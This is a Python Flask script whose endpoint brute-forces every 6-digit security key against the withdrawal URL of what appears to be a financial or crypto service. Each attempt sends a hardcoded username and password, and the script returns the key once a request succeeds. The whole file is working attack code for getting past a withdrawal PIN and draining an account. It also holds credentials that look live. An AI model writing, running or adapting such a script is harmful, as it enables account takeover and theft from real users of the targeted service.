import logging
from flask import Flask, jsonify
import itertools
import requests

# Initialize Flask app
app = Flask(__name__)

# Replace with actual credentials and URL
username = "canary22"
password = "T2RyGb$A7"
withdrawal_url = "https://sohei.io/withdraw"

# Setup logging
logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger()

# Function to attempt withdrawal with a given security key
def attempt_withdrawal(security_key):
    logger.debug(f"Attempting withdrawal with security key: {security_key}")
    data = {'username': username, 'password': password, 'security_key': security_key}
    try:
        response = requests.post(withdrawal_url, data=data)
        if response.status_code == 200:
            logger.info(f"Login successful with security key: {security_key}")
        else:
            logger.warning(f"Failed with security key {security_key}, Status Code: {response.status_code}")
        return response.status_code, response.text
    except Exception as e:
        logger.error(f"Error during withdrawal attempt with key {security_key}: {e}")
        return None, str(e)

# Generate all possible 6-digit security keys
def generate_security_keys():
    logger.info("Generating all possible 6-digit security keys.")
    return [''.join(i) for i in itertools.product("0123456789", repeat=6)]

@app.route('/start_withdrawal', methods=['GET'])
def start_withdrawal():
    # Generate the list of all 6-digit security keys
    logger.info("Starting the withdrawal process...")
    security_keys = generate_security_keys()

    for key in security_keys:
        status_code, response_text = attempt_withdrawal(key)
        
        # Check if the attempt is successful
        if status_code == 200:  # Or whatever indicates success
            logger.info(f"Success! Security key found: {key}")
            return jsonify({"status": "success", "security_key": key}), 200
        else:
            logger.debug(f"Attempt failed with key: {key}, Status Code: {status_code}, Response: {response_text}")

    logger.error("No valid security key found.")
    return jsonify({"status": "failure", "message": "No valid security key found."}), 400

if __name__ == '__main__':
    # Start the Flask app
    logger.info("Starting the Flask web service.")
    app.run(debug=True, host='0.0.0.0', port=5000)
